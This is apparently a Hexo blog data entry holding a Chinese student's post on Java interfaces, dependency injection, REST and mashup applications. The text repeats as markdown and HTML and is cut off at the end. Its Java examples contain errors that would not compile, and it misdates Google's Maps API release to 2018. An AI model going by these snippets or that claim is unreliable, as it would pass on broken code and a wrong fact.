约定\n\n在现实生活中，充斥着大量的约定。比如说，去买早点，大家都约定好，你给我钱，我给你吃的；手机买回来，充电插头一定是双脚的；无论在哪买的 USB，都能插上电脑，传输数据；无论什么城市，过马路时，红灯都得停下来。。。\n\n小到微观世界，大到整个宇宙，大大小小都围绕着某种约定，做着正确的事。一旦违背了约定，定会遭到惩罚。\n\n仔细思考一下约定这种行为，它必定是由多个人共同承担起。假如世界上只有一个人，他做什么事都不会违背约定。\n\n接口其实也是一种约定。用更准确的说法，便是「协议」(protocol)。\n\n嘴巴有个功能就是说话，至于怎么说，说什么，每个人都有不同的实现方式。中国人有中国人的说法，日本人有日本人的说法，但它们都要满足，会说这个功能（这里只是为了方便解释，就不要问我哑巴怎么办）。\n\n在多人合作时，这样就很方便。只要有接口就好了，具体怎么做就看你的了。但无论你怎么做，都不能违返这个接口定下的规则。\n\n## 服务\n\n当我们尝试将接口变成核心时，就会发现，很多事情变得简单了。\n\n首先，我不再关心调用者实现，调用者也不再关心我的实现。比如有调用者用了我的类做了点事情。\n\n```\nclass user{\n    public function do(Human H){\n        H.sayHello();\n        H.sayGoodbye();\n    }\n}\n```\n\n这里的 H，调用者可以放 Chinese 实例，可以放 Japenese 实例，可以放 American 实例，都无所谓。只要他传进来的东西满足\n\n- 是 Human 类\n- 实现了统一的接口\n\n那就没任何问题。\n\n与之而来的是，我这边的任务也会很轻松。我定义了接口之后，就可以在满足接口的定义下，任意实现功能。\n\n调用者和服务者之间的联系变弱了，但也更强硬了，我们不一定需要你，但我们都必须遵守约定，遵守接口。\n\n## 云服务\n\n现在出现的大量的云服务，也是建立在这个基础之上。如果有兴趣，可以上腾讯云或者阿里云的网站上看看。\n\n![腾讯云服务](1564906395080.png)\n\n如果想要人脸识别的功能，你大可不必亲自实现，只要满足了接口的要求，花点小钱，就可以实现。\n\n## 更深一点的内容\n\n如果只是想了解接口，上面的东西已经足够了。但如果想要来点更深的东西，就继续往下看吧。\n\n### 依赖注入(Dependency Injection)\n\n依賴注入是我在看 Spring 框架时，遇到的第一个词。\n\n之所以用接口，是因为我们在编程时，不得不面对一个问题：依赖。\n\n在实际工作中，经常就会写出这样的东西。\n\n```\npublic BMW_wheel{\n  public void go{\n      System.out.print(\"BMW's wheels working!\");\n  }\n}\n\npublic BMW_Car {\n  Wheel BMW_Wheel;\n  public BWM_Car(){\n    BMW_Wheel = new BMW_Wheel();\n  }\n  public void BMM_Run(){\n     BMW_Wheel.go();\n  }\n}\n\npublic Person{\n  public void drive(){\n     BMW_Car Car = new BMW_Car();\n     Car.BMW_Run();\n  }\n}\n```\n\n上面的代码是没任何问题，事实上，也是可以这么写的。但问题在于，假如我做出的这个东西不是我一个人用，而是分享给很多人用，有的人不想用宝马的轮子，而是想用奔驰的轮子，有的人想改用自己家造的轮子。那么每个人都要读懂上面我写的东西，改得 Car 的实例化过程，最后才能正常的用自己设定的轮子跑起来。如果，假设，在 BMW_Car 又被另一个 Person 类依赖，Person 类被 Company 依赖，那么改动一小点，都会引发滚雪球式的灾难。\n\n而解决这一个问题的思想，就是改变我们的想法，将依赖关系倒转过来。\n\n如果我在写上面的类时，留有一些空隙，问题就会变得很简单。\n\n```\ninterface Car{\n  public void Run(Wheel wheel);\n}\n```\n\n同时，轮子类也做个接口\n\n```\ninterface Wheel{\n  public void go();\n}\n```\n\n之后，实现车类。\n\n```\npublic BMW_Car implement Car{\n  Wheel wheel;\n  public void BMW_Car(Wheel wheel){\n      this.wheel = wheel;\n  }\n  \n  public void Run(){\n    this.wheel.go();\n  }\n}\n\npublic Tesla implements Car{\n  Wheel wheel;\n\n  public void Tesla(Wheel wheel){\n    this.wheel = wheel;\n  }\n\n  public void Run(){\n    this.wheel.go();\n  }\n}\n```\n\n通过接口，轮子类和车轮之间的耦合度降低了。在上面，我不再关心这辆宝马车用的是什么轮子。我要的只是轮子，你只要满足轮子接口的东西就可以了。\n\n你完全可以写成下面的代码。\n\n```\nclass Person{\n  public void driving(){\n      Car BMW_Car = new BMW_Car()\n  }\n}\n```\n\n（为什么不用万能的 Python 来写这段代码？那是因为 Python 是鸭子类型啊，不需要接口）\n\n### REST 风格\n\n解决依赖的方法除了在代码上，我们还可以通过使用更成熟的思想。\n\n在 2000 年，Fielding 大佬的博士论文的第五章，介绍了一种架构风格，叫作 REST（Representation state transfer）。这种风格，如今应用于各大应用中。\n\n简单来说，客户端与服务器交流时，每次请求都与上一次无关。换而言之，每一次请求都不依赖于上一次请求。这样，我们将耦合降到了最低。当我需要资源时，只需要向服务器请求，我只知道向哪一个 URL 请求，根本无需知道我所请求的是分布式系统中的具体的哪一个，因为每一次请求对它们而言，都是崭新的。这样，不需要担心可拓展性。\n\n同时，RESTful 带来的好处还有：改善了可见性。由于每一次请求得到的数据都不应该超过一次请求所得到的数据，因此数据的完整性得到了保证。同时，提升了可靠性。如果请求出了问题，我们也只需要恢复一次请求便可以了。\n\n通过这一风格设计出来的接口，在通用性上会大大增强。\n\n### MASHUP 应用\n\n当接口设计得足够多，与之而来的，应用上的发展也开始了。\n\nmashup 最早起源于音乐界，将不同的音乐混合在一起的演出方式。在如今的 IT 界中，它表示一种应用做法：组合不同的 WEB 服务，合成一个应用。\n\n举个例子。 2018年，GOOGLE 公开了 GOOGLE MAP 的数据接口。因此，每个人都可以用它，和其它服务，比如天气服务接口，做出一个新的应用，在地图上显示每个城市的天气，或者做更有趣的，比如抄袭 Pokemon GO，做个捉妖怪的游戏。\n\nmashup 的组成分成三部分。一部分是服务提供商(者)，一部分是 mashup 站点，一部分是客户端。这三者每一部分都是可替代，我可以用不同服务商提供的 api，这个应用也可是另一个人来做，至于服务端，大多数是基于浏览器，你换成哪一个浏览器都可以。于是，mashup 属于松散耦合，可以说，是利用接口最好的诠释。\n\n---\n\n又说了一大堆无用的东西。\n","slug":"面向接口","published":1,"updated":"2020-03-07T08:09:13.845Z","_id":"ck7h7792y0002633x26rl5flh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在实习了一个星期之后，对接口有了更深入的思考。</p>\n<p>写代码对我而言只是一种兴趣。由于没有任何人对我做出任何要求，很多时候，我只要求将东西写出来就可以了。每当学到新的东西，就一股脑地加入其中，久而久之，我再翻看过去写的代码，只觉得冗长且难看。好在，这些东西大多数时候只有我一个人看，写成什么样都无所谓了。</p>\n<a id=\"more\"></a>\n\n<p>但现在马上毕业，也不能再任性下去。我得学会和他人合作，共同写出每一个人都能理解的东西。重要的是，当其中一个人离开时，新加入的人可以理解，并很快加入其中。</p>\n<p>当然，站在老板的角度上，这样就可以压榨更多员工了。但站在更大的角度上看，我们所做出来的东西，如果能被世界的人理解，并使用，共同创造出一个东西。这一个东西，不会因为时间，空间，乃至人的变化，而变化，它可以被每一个人所继承，所共有，并传递下去，实现永恒，这不是很棒吗？</p>\n<p>过去我一直一个人在战斗，虽然也会用大佬做的库，但它们只是我实现目标的工具，并非过程。而这一次，要实现的就是工具。简单来讲，我的职责，从调用者，变成了服务者。既然职责发生了转变，那么思维也要跟着发生转变。</p>\n<p>于是，我开始理解，过去无法理解的事情。</p>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>JAVA 的面向对象中，有一个叫做接口（Interface）的东西。接口很像一个类，又与类不同，比如，接口禁止申明函数的过程。就比如下面的写法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">interface mouth&#123;</span><br><span class=\"line\">    public void sayHello();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;下面的写法是禁止的</span><br><span class=\"line\"></span><br><span class=\"line\">interface mouth&#123;</span><br><span class=\"line\">    public void sayHello()&#123;</span><br><span class=\"line\">      return &quot;Hello&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那函数没有具体的功能，那它就没用了吗？</p>\n<p>不，是有用的，它可以被其它类实现 (implements)，然后赋予这个函数功能。比如下面的写法:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Chinese implements mouth&#123;</span><br><span class=\"line\">    public void sayHello()&#123;</span><br><span class=\"line\">        return &quot;你好！&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Japenese implements mouth&#123;</span><br><span class=\"line\">    public void sayHello()&#123;</span><br><span class=\"line\">        return &quot;konijiwa！&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>很奇怪吧。明明在最开始就可以做到的事情，为什么要在后面用另一个类实现？ 明明可以用继承的方式，为什么要多加一个接口的概念？</p>\n<h2 id=\"约定\"><a href=\"#约定\" class=\"headerlink\" title=\"约定\"></a>约定</h2><p>在现实生活中，充斥着大量的约定。比如说，去买早点，大家都约定好，你给我钱，我给你吃的；手机买回来，充电插头一定是双脚的；无论在哪买的 USB，都能插上电脑，传输数据；无论什么城市，过马路时，红灯都得停下来。。。</p>\n<p>小到微观世界，大到整个宇宙，大大小小都围绕着某种约定，做着正确的事。一旦违背了约定，定会遭到惩罚。</p>\n<p>仔细思考一下约定这种行为，它必定是由多个人共同承担起。假如世界上只有一个人，他做什么事都不会违背约定。</p>\n<p>接口其实也是一种约定。用更准确的说法，便是「协议」(protocol)。</p>\n<p>嘴巴有个功能就是说话，至于怎么说，说什么，每个人都有不同的实现方式。中国人有中国人的说法，日本人有日本人的说法，但它们都要满足，会说这个功能（这里只是为了方便解释，就不要问我哑巴怎么办）。</p>\n<p>在多人合作时，这样就很方便。只要有接口就好了，具体怎么做就看你的了。但无论你怎么做，都不能违返这个接口定下的规则。</p>\n<h2 id=\"服务\"><a href=\"#服务\" class=\"headerlink\" title=\"服务\"></a>服务</h2><p>当我们尝试将接口变成核心时，就会发现，很多事情变得简单了。</p>\n<p>首先，我不再关心调用者实现，调用者也不再关心我的实现。比如有调用者用了我的类做了点事情。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class user&#123;</span><br><span class=\"line\">    public function do(Human H)&#123;</span><br><span class=\"line\">        H.sayHello();</span><br><span class=\"line\">        H.sayGoodbye();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 H，调用者可以放 Chinese 实例，可以放 Japenese 实例，可以放 American 实例，都无所谓。只要他传进来的东西满足</p>\n<ul>\n<li>是 Human 类</li>\n<li>实现了统一的接口</li>\n</ul>\n<p>那就没任何问题。</p>\n<p>与之而来的是，我这边的任务也会很轻松。我定义了接口之后，就可以在满足接口的定义下，任意实现功能。</p>\n<p>调用者和服务者之间的联系变弱了，但也更强硬了，我们不一定需要你，但我们都必须遵守约定，遵守接口。</p>\n<h2 id=\"云服务\"><a href=\"#云服务\" class=\"headerlink\" title=\"云服务\"></a>云服务</h2><p>现在出现的大量的云服务，也是建立在这个基础之上。如果有兴趣，可以上腾讯云或者阿里云的网站上看看。</p>\n<p><img src=\"1564906395080.png\" alt=\"腾讯云服务\"></p>\n<p>如果想要人脸识别的功能，你大可不必亲自实现，只要满足了接口的要求，花点小钱，就可以实现。</p>\n<h2 id=\"更深一点的内容\"><a href=\"#更深一点的内容\" class=\"headerlink\" title=\"更深一点的内容\"></a>更深一点的内容</h2><p>如果只是想了解接口，上面的东西已经足够了。但如果想要来点更深的东西，就继续往下看吧。</p>\n<h3 id=\"依赖注入-Dependency-Injection\"><a href=\"#依赖注入-Dependency-Injection\" class=\"headerlink\" title=\"依赖注入(Dependency Injection)\"></a>依赖注入(Dependency Injection)</h3><p>依賴注入是我在看 Spring 框架时，遇到的第一个词。</p>\n<p>之所以用接口，是因为我们在编程时，不得不面对一个问题：依赖。</p>\n<p>在实际工作中，经常就会写出这样的东西。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public BMW_wheel&#123;</span><br><span class=\"line\">  public void go&#123;</span><br><span class=\"line\">      System.out.print(&quot;BMW&#39;s wheels working!&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public BMW_Car &#123;</span><br><span class=\"line\">  Wheel BMW_Wheel;</span><br><span class=\"line\">  public BWM_Car()&#123;</span><br><span class=\"line\">    BMW_Wheel &#x3D; new BMW_Wheel();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  public void BMM_Run()&#123;</span><br><span class=\"line\">     BMW_Wheel.go();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public Person&#123;</span><br><span class=\"line\">  public void drive()&#123;</span><br><span class=\"line\">     BMW_Car Car &#x3D; new BMW_Car();</span><br><span class=\"line\">     Car.BMW_Run();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码是没任何问题，事实上，也是可以这么写的。但问题在于，假如我做出的这个东西不是我一个人用，而是分享给很多人用，有的人不想用宝马的轮子，而是想用奔驰的轮子，有的人想改用自己家造的轮子。那么每个人都要读懂上面我写的东西，改得 Car 的实例化过程，最后才能正常的用自己设定的轮子跑起来。如果，假设，在 BMW_Car 又被另一个 Person 类依赖，Person 类被 Company 依赖，那么改动一小点，都会引发滚雪球式的灾难。</p>\n<p>而解决这一个问题的思想，就是改变我们的想法，将依赖关系倒转过来。</p>\n<p>如果我在写上面的类时，留有一些空隙，问题就会变得很简单。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">interface Car&#123;</span><br><span class=\"line\">  public void Run(Wheel wheel);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同时，轮子类也做个接口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">interface Wheel&#123;</span><br><span class=\"line\">  public void go();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>之后，实现车类。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public BMW_Car implement Car&#123;</span><br><span class=\"line\">  Wheel wheel;</span><br><span class=\"line\">  public void BMW_Car(Wheel wheel)&#123;</span><br><span class=\"line\">      this.wheel &#x3D; wheel;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  public void Run()&#123;</span><br><span class=\"line\">    this.wheel.go();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public Tesla implements Car&#123;</span><br><span class=\"line\">  Wheel wheel;</span><br><span class=\"line\"></span><br><span class=\"line\">  public void Tesla(Wheel wheel)&#123;</span><br><span class=\"line\">    this.wheel &#x3D; wheel;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  public void Run()&#123;</span><br><span class=\"line\">    this.wheel.go();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过接口，轮子类和车轮之间的耦合度降低了。在上面，我不再关心这辆宝马车用的是什么轮子。我要的只是轮子，你只要满足轮子接口的东西就可以了。</p>\n<p>你完全可以写成下面的代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Person&#123;</span><br><span class=\"line\">  public void driving()&#123;</span><br><span class=\"line\">      Car BMW_Car &#x3D; new BMW_Car()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>（为什么不用万能的 Python 来写这段代码？那是因为 Python 是鸭子类型啊，不需要接口）</p>\n<h3 id=\"REST-风格\"><a href=\"#REST-风格\" class=\"headerlink\" title=\"REST 风格\"></a>REST 风格</h3><p>解决依赖的方法除了在代码上，我们还可以通过使用更成熟的思想。</p>\n<p>在 2000 年，Fielding 大佬的博士论文的第五章，介绍了一种架构风格，叫作 REST（Representation state transfer）。这种风格，如今应用于各大应用中。</p>\n<p>简单来说，客户端与服务器交流时，每次请求都与上一次无关。换而言之，每一次请求都不依赖于上一次请求。这样，我们将耦合降到了最低。当我需要资源时，只需要向服务器请求，我只知道向哪一个 URL 请求，根本无需知道我所请求的是分布式系统中的具体的哪一个，因为每一次请求对它们而言，都是崭新的。这样，不需要担心可拓展性。</p>\n<p>同时，RESTful 带来的好处还有：改善了可见性。由于每一次请求得到的数据都不应该超过一次请求所得到的数据，因此数据的完整性得到了保证。同时，提升了可靠性。如果请求出了问题，我们也只需要恢复一次请求便可以了。</p>\n<p>通过这一风格设计出来的接口，在通用性上会大大增强。</p>\n<h3 id=\"MASHUP-应用\"><a href=\"#MASHUP-应用\" class=\"headerlink\" title=\"MASHUP 应用\"></a>MASHUP 应用</h3><p>当接口设计得足够多，与之而来的，应用上的发展也开始了。</p>\n<p>mashup 最早起源于音乐界，将不同的音乐混合在一起的演出方式。在如今的 IT 界中，它表示一种应用做法：组合不同的 WEB 服务，合成一个应用。</p>\n<p>举个例子。 2018年，GOOGLE 公开了 GOOGLE MAP 的数据接口。因此，每个人都可以用它，和其它服务，比如天气服务接口，做出一个新的应用，在地图上显示每个城市的天气，或者做更有趣的，比如抄袭 Pokemon GO，做个捉妖怪的游戏。</p>\n<p>mashup 的组成分成三部分。一部分是服务提供商(者)，一部分是 mashup 站点，一部分是客户端。这三者每一部分都是可替代，我可以用不同服务商提供的 api，这个应用也可是另一个人来做，至于服务端，大多数是基于浏览器，你换成哪一个浏览器都可以。于是，mashup 属于松散耦合，可以说，是利用接口最好的诠释。</p>\n<hr>\n<p>又说了一大堆无用的东西。</p>\n","site":{"data":{}},"excerpt":"<p>在实习了一个星期之后，对接口有了更深入的思考。</p>\n<p>写代码对我而言只是一种兴趣。由于没有任何人对我做出任何要求，很多时候，我只要求将东西写出来就可以了。每当学到新的东西，就一股脑地加入其中，久而久之，我再翻看过去写的代码，只觉得冗长且难看。好在，这些东西大多数时候只有我一个人看，写成什么样都无所谓了。</p>","more":"<p>但现在马上毕业，也不能再任性下去。我得学会和他人合作，共同写出每一个人都能理解的东西。重要的是，当其中一个人离开时，新加入的人可以理解，并很快加入其中。</p>\n<p>当然，站在老板的角度上，这样就可以压榨更多员工了。但站在更大的角度上看，我们所做出来的东西，如果能被世界的人理解，并使用，共同创造出一个东西。这一个东西，不会因为时间，空间，乃至人的变化，而变化，它可以被每一个人所继承，所共有，并传递下去，实现永恒，这不是很棒吗？</p>\n<p>过去我一直一个人在战斗，虽然也会用大佬做的库，但它们只是我实现目标的工具，并非过程。而这一次，要实现的就是工具。简单来讲，我的职责，从调用者，变成了服务者。既然职责发生了转变，那么思维也要跟着发生转变。</p>\n<p>于是，我开始理解，过去无法理解的事情。</p>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>JAVA 的面向对象中，有一个叫做接口（Interface）的东西。接口很像一个类，又与类不同，比如，接口禁止申明函数的过程。就比如下面的写法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">interface mouth&#123;</span><br><span class=\"line\">    public void sayHello();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;下面的写法是禁止的</span><br><span class=\"line\"></span><br><span class=\"line\">interface mouth&#123;</span><br><span class=\"line\">    public void sayHello()&#123;</span><br><span class=\"line\">      return &quot;Hello&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那函数没有具体的功能，那它就没用了吗？</p>\n<p>不，是有用的，它可以被其它类实现 (implements)，然后赋予这个函数功能。比如下面的写法:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Chinese implements mouth&#123;</span><br><span class=\"line\">    public void sayHello()&#123;</span><br><span class=\"line\">        return &quot;你好！&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Japenese implements mouth&#123;</span><br><span class=\"line\">    public void sayHello()&#123;</span><br><span class=\"line\">        return &quot;konijiwa！&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>很奇怪吧。明明在最开始就可以做到的事情，为什么要在后面用另一个类实现？ 明明可以用继承的方式，为什么要多加一个接口的概念？</p>\n<h2 id=\"约定\"><a href=\"#约定\" class=\"headerlink\" title=\"约定\"></a>约定</h2><p>在现实生活中，充斥着大量的约定。比如说，去买早点，大家都约定好，你给我钱，我给你吃的；手机买回来，充电插头一定是双脚的；无论在哪买的 USB，都能插上电脑，传输数据；无论什么城市，过马路时，红灯都得停下来。。。</p>\n<p>小到微观世界，大到整个宇宙，大大小小都围绕着某种约定，做着正确的事。一旦违背了约定，定会遭到惩罚。</p>\n<p>仔细思考一下约定这种行为，它必定是由多个人共同承担起。假如世界上只有一个人，他做什么事都不会违背约定。</p>\n<p>接口其实也是一种约定。用更准确的说法，便是「协议」(protocol)。</p>\n<p>嘴巴有个功能就是说话，至于怎么说，说什么，每个人都有不同的实现方式。中国人有中国人的说法，日本人有日本人的说法，但它们都要满足，会说这个功能（这里只是为了方便解释，就不要问我哑巴怎么办）。</p>\n<p>在多人合作时，这样就很方便。只要有接口就好了，具体怎么做就看你的了。但无论你怎么做，都不能违返这个接口定下的规则。</p>\n<h2 id=\"服务\"><a href=\"#服务\" class=\"headerlink\" title=\"服务\"></a>服务</h2><p>当我们尝试将接口变成核心时，就会发现，很多事情变得简单了。</p>\n<p>首先，我不再关心调用者实现，调用者也不再关心我的实现。比如有调用者用了我的类做了点事情。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class user&#123;</span><br><span class=\"line\">    public function do(Human H)&#123;</span><br><span class=\"line\">        H.sayHello();</span><br><span class=\"line\">        H.sayGoodbye();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 H，调用者可以放 Chinese 实例，可以放 Japenese 实例，可以放 American 实例，都无所谓。只要他传进来的东西满足</p>\n<ul>\n<li>是 Human 类</li>\n<li>实现了统一的接口</li>\n</ul>\n<p>那就没任何问题。</p>\n<p>与之而来的是，我这边的任务也会很轻松。我定义了接口之后，就可以在满足接口的定义下，任意实现功能。</p>\n<p>调用者和服务者之间的联系变弱了，但也更强硬了，我们不一定需要你，但我们都必须遵守约定，遵守接口。</p>\n<h2 id=\"云服务\"><a href=\"#云服务\" class=\"headerlink\" title=\"云服务\"></a>云服务</h2><p>现在出现的大量的云服务，也是建立在这个基础之上。如果有兴趣，可以上腾讯云或者阿里云的网站上看看。</p>\n<p><img src=\"1564906395080.png\" alt=\"腾讯云服务\"></p>\n<p>如果想要人脸识别的功能，你大可不必亲自实现，只要满足了接口的要求，花点小钱，就可以实现。</p>\n<h2 id=\"更深一点的内容\"><a href=\"#更深一点的内容\" class=\"headerlink\" title=\"更深一点的内容\"></a>更深一点的内容</h2><p>如果只是想了解接口，上面的东西已经足够了。但如果想要来点更深的东西，就继续往下看吧。</p>\n<h3 id=\"依赖注入-Dependency-Injection\"><a href=\"#依赖注入-Dependency-Injection\" class=\"headerlink\" title=\"依赖注入(Dependency Injection)\"></a>依赖注入(Dependency Injection)</h3><p>依賴注入是我在看 Spring 框架时，遇到的第一个词。</p>\n<p>之所以用接口，是因为我们在编程时，不得不面对一个问题：依赖。</p>\n<p>在实际工作中，经常就会写出这样的东西。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public BMW_wheel&#123;</span><br><span class=\"line\">  public void go&#123;</span><br><span class=\"line\">      System.out.print(&quot;BMW&#39;s wheels working!&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public BMW_Car &#123;</span><br><span class=\"line\">  Wheel BMW_Wheel;</span><br><span class=\"line\">  public BWM_Car()&#123;</span><br><span class=\"line\">    BMW_Wheel &#x3D; new BMW_Wheel();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  public void BMM_Run()&#123;</span><br><span class=\"line\">     BMW_Wheel.go();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public Person&#123;</span><br><span class=\"line\">  public void drive()&#123;</span><br><span class=\"line\">     BMW_Car Car &#x3D; new BMW_Car();</span><br><span class=\"line\">     Car.BMW_Run();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面的代码是没任何问题，事实上，也是可以这么写的。但问题在于，假如我做出的这个东西不是我一个人用，而是分享给很多人用，有的人不想用宝马的轮子，而是想用奔驰的轮子，有的人想改用自己家造的轮子。那么每个人都要读懂上面我写的东西，改得 Car 的实例化过程，最后才能正常的用自己设定的轮子跑起来。如果，假设，在 BMW_Car 又被另一个 Person 类依赖，Person 类被 Company 依赖，那么改动一小点，都会引发滚雪球式的灾难。</p>\n<p>而解决这一个问题的思想，就是改变我们的想法，将依赖关系倒转过来。</p>\n<p>如果我在写上面的类时，留有一些空隙，问题就会变得很简单。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td 